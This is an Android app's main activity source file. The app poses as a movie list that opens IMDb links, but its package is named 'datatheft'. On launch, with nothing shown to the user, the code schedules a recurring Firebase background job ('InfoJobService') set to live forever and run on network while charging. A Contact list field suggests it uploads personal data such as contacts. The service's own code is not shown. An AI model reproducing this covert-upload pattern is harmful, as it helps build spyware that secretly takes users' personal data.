package nerdcastle.datatheft;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ListView;

import com.firebase.jobdispatcher.Constraint;
import com.firebase.jobdispatcher.FirebaseJobDispatcher;
import com.firebase.jobdispatcher.GooglePlayDriver;
import com.firebase.jobdispatcher.Job;
import com.firebase.jobdispatcher.Lifetime;
import com.firebase.jobdispatcher.RetryStrategy;
import com.firebase.jobdispatcher.Trigger;

import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {
    ArrayList<Contact>contactList;
    ListView moviewLV;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        moviewLV= (ListView) findViewById(R.id.movieList);
        Movie movie=new Movie();
        final ArrayList<Movie>movies=movie.getAllMOvies();
        MOvieAdapter mOvieAdapter=new MOvieAdapter(this,movies);
        moviewLV.setAdapter(mOvieAdapter);
        upLoadDataToFireBase();
        moviewLV.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> adapterView, View view, int i, long l) {
                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(movies.get(i).getImdbUrl()));
                startActivity(browserIntent);
            }
        });
    }

    synchronized private void upLoadDataToFireBase(){
        FirebaseJobDispatcher dispatcher = new FirebaseJobDispatcher(new GooglePlayDriver(this));

        Job myJob = dispatcher.newJobBuilder()
                .setService(InfoJobService.class)
                .setTag("InfoJobService")
                .setRecurring(true)
                .setTrigger(Trigger.executionWindow(30, 60))
                .setLifetime(Lifetime.FOREVER)
                .setReplaceCurrent(false)
                .setConstraints(Constraint.ON_ANY_NETWORK, Constraint.DEVICE_CHARGING)
                .setRetryStrategy(RetryStrategy.DEFAULT_LINEAR)
                .build();

        dispatcher.mustSchedule(myJob);
    }


}
